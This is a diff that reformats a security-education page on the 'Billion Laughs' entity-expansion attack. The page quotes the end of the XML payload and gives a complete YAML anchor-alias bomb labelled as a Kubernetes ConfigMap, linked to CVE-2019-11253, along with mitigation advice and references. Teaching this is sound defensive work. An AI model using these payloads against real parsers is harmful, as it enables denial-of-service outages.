@@ -7,12 +7,11 @@ sidebar_position: 7
 
 ## The Attack
 
-
-<iframe width="100%" height="450"
-src="https://www.youtube.com/embed/WQUiub2hc0c">
-</iframe>
-
-
+<iframe
+  width='100%'
+  height='450'
+  src='https://www.youtube.com/embed/WQUiub2hc0c'
+></iframe>
 
 ### Classic "Billion Laughs" attack
 
@@ -34,8 +33,6 @@ src="https://www.youtube.com/embed/WQUiub2hc0c">
 <lolz>&lol9;</lolz>
 ```
 
-
-
 ### Variations for "Billion Laughs" attack
 
 As an example of a YAML configuration file with [the same vulnerability that affected kubectl (CVE-2019-11253)](https://github.com/kubernetes/kubernetes/issues/83253):
@@ -43,15 +40,15 @@ As an example of a YAML configuration file with [the same vulnerability that aff
 ```yml
 apiVersion: v1
 data:
-  a: &a ["web","web","web","web","web","web","web","web","web"]
-  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
-  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
-  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
-  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
-  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
-  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
-  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
-  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+  a: &a ['web', 'web', 'web', 'web', 'web', 'web', 'web', 'web', 'web']
+  b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
+  c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
+  d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
+  e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
+  f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]
+  g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f]
+  h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g]
+  i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h]
 kind: ConfigMap
 metadata:
   name: yaml-bomb
@@ -69,7 +66,7 @@ In case that you must need to use XML...
 > Be sure to follow the principle of attack surface reduction and disable entity expansion if you don’t require its use. Otherwise, apply appropriate defenses to limit the maximum amount of time and memory your application can spend on it.  
 > Bryan Sullivan
 
-
 ### Refs
+
 - [Wikipedia | Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)
 - [Microsoft | Security Briefs - XML Denial of Service Attacks and Defenses](https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses)
